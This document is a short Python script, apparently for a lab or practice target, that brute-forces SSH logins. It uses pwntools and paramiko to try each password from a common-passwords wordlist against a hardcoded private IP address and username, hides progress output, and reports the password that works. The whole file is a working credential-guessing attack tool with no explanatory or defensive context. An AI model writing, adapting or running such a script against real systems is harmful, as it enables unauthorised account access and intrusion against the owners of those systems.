# Modified script

from pwn import *
import paramiko
import os
import sys

# Define ANSI escape codes for colors
COLOUR = '\033[93m'
RESET = '\033[0m'

# Redirect stderr to /dev/null
os.environ['PWNLIB_NOTERM'] = 'True'
context.log_level = 'error'  # Suppress progress bar output

# Provide hostname and username from user input
host = "172.16.90.143"
username = "encient"
password_list = "ssh-common-passwords.txt"

# Strip the password
with open(password_list, "r") as wordlist:
	for password in wordlist:
		password = password.strip()
		
		try:
			print(f"Attempting to brute force with '{password}'")
			response = ssh(host=host, user=username, password=password)

			if response.connected:
				print(COLOUR + f"Password found. The correct password is '{password}'." + RESET)
				response.close()
				break

			response.close()

		except paramiko.ssh_exception.AuthenticationException:
			print("Invalid password.")
	
	print("SSH brute forcing process done.")
